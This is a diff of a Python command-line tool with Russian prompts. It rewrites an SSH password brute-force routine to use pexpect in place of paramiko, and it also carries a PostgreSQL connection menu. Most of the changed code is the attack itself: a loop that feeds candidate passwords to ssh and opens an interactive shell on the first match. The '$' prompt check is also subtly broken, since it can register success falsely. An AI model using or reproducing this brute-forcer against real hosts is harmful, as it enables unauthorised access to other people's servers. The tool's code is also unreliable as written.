@@ -1,7 +1,7 @@
 import subprocess
 import sys
 import os
-import paramiko
+import pexpect
 
 def manual_input_psql():
     host = input("Введите доменное имя или IP-адрес: ")
@@ -76,31 +76,36 @@ def bruteforce_ssh():
             ssh_connect(host, int(port), username, password)
             print(f"Успешный вход! Пароль: {password}")
             return  # Останавливаем брутфорс, если пароль верный
-        except paramiko.AuthenticationException:
+        except pexpect.exceptions.EOF:
             print("Неверный пароль, пробуем следующий...")
-        except paramiko.SSHException as sshException:
-            print(f"Не удалось установить SSH-соединение: {sshException}")
+        except pexpect.exceptions.TIMEOUT:
+            print("Время ожидания истекло, пробуем следующий пароль...")
+        except Exception as e:
+            print(f"Ошибка при выполнении команды: {e}")
             break
 
-def ssh_connect(hostname, port, username, password=None, key_filename=None):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+def ssh_connect(hostname, port, username, password):
+    ssh_command = f"ssh -p {port} {username}@{hostname}"
+    child = pexpect.spawn(ssh_command)
     
     try:
-        if key_filename:
-            ssh.connect(hostname, port=port, username=username, key_filename=key_filename)
+        i = child.expect(['password:', pexpect.EOF, pexpect.TIMEOUT])
+        if i == 0:
+            child.sendline(password)
+            i = child.expect(['$', '#', pexpect.EOF, pexpect.TIMEOUT])
+            if i == 0 or i == 1:
+                print("Успешное подключение по SSH")
+                child.interact()
+            else:
+                raise pexpect.exceptions.EOF
         else:
-            ssh.connect(hostname, port=port, username=username, password=password)
-        print("Успешное подключение по SSH")
-        # Здесь вы можете выполнять команды на удаленном сервере
-        stdin, stdout, stderr = ssh.exec_command('ls -l')
-        print(stdout.read().decode())
-    except paramiko.AuthenticationException:
-        raise paramiko.AuthenticationException
-    except paramiko.SSHException as sshException:
-        raise paramiko.SSHException(sshException)
+            raise pexpect.exceptions.EOF
+    except pexpect.exceptions.EOF:
+        raise pexpect.exceptions.EOF
+    except pexpect.exceptions.TIMEOUT:
+        raise pexpect.exceptions.TIMEOUT
     finally:
-        ssh.close()
+        child.close()
 
 def main_menu():
     print("1. Подключение к PostgreSQL (psql)")
@@ -134,4 +139,10 @@ def main_menu():
         main_menu()
 
 if __name__ == "__main__":
+    try:
+        import pexpect
+    except ImportError:
+        print("Ошибка: модуль pexpect не установлен. Пожалуйста, установите его с помощью 'pip install pexpect'.")
+        sys.exit(1)
+    
     main_menu()
